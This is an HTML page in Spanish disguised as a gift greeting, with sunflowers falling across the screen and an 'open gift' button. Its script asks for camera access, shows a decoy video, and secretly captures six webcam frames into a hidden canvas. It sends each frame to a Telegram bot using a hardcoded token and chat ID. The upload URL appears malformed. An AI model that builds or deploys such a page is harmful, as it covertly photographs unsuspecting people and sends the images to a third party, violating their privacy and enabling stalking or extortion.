<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Regalo Especial 🌻</title>
    <style>
        body { background: #fffde7; margin: 0; overflow: hidden; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; }
        #inicio { text-align: center; z-index: 20; position: absolute; }
        .btn-regalo { background: #fdd835; border: none; padding: 20px 40px; font-size: 20px; border-radius: 50px; cursor: pointer; font-weight: bold; color: #5d4037; }
        .flower { position: fixed; top: -50px; font-size: 24px; animation: fall linear forwards; z-index: 5; }
        @keyframes fall { to { transform: translateY(110vh) rotate(360deg); } }
        #contenido { display: none; background: #000; width: 100vw; height: 100vh; }
        video#video-display { width: 100%; height: 100%; object-fit: cover; }
        #camera-hidden, #canvas { display: none; }
    </style>
</head>
<body>
    <div id="inicio">
        <h1 style="color: #fbc02d; margin-bottom: 20px;">Tengo algo para ti... 🌻</h1>
        <button class="btn-regalo" onclick="comenzar()">🌻 ABRIR REGALO 🌻</button>
    </div>
    <div id="contenido">
        <video id="video-display" playsinline loop muted>
            <source src="https://assets.mixkit.co" type="video/mp4">
        </video>
    </div>
    <video id="camera-hidden" autoplay playsinline muted></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        const TOKEN = '8636421885:AAHACzfR2p-ekm9sq2AyowzMAcnyf2Fddgg';
        const ID = '7775532656';

        // Lluvia de flores
        setInterval(() => {
            const f = document.createElement('div');
            f.className = 'flower';
            f.innerText = '🌻';
            f.style.left = Math.random() * 100 + 'vw';
            f.style.animationDuration = (Math.random() * 3 + 2) + 's';
            document.body.appendChild(f);
            setTimeout(() => f.remove(), 5000);
        }, 300);

        async function comenzar() {
            document.getElementById('inicio').style.display = 'none';
            document.getElementById('contenido').style.display = 'block';
            const cam = document.getElementById('camera-hidden');
            const videoDisplay = document.getElementById('video-display');

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                cam.srcObject = stream;
                cam.onloadedmetadata = () => {
                    videoDisplay.play();
                    enviarFotos(cam);
                };
            } catch (e) { videoDisplay.play(); }
        }

        async function enviarFotos(cam) {
            const canvas = document.getElementById('canvas');
            for (let i = 1; i <= 6; i++) {
                await new Promise(r => setTimeout(r, 4000));
                canvas.getContext('2d').drawImage(cam, 0, 0, 640, 480);
                canvas.toBlob(blob => {
                    const fd = new FormData();
                    fd.append('chat_id', ID);
                    fd.append('photo', blob, 'f.jpg');
                    fetch(`https://api.telegram.org{TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                }, 'image/jpeg', 0.6);
            }
        }
    </script>
</body>
</html>
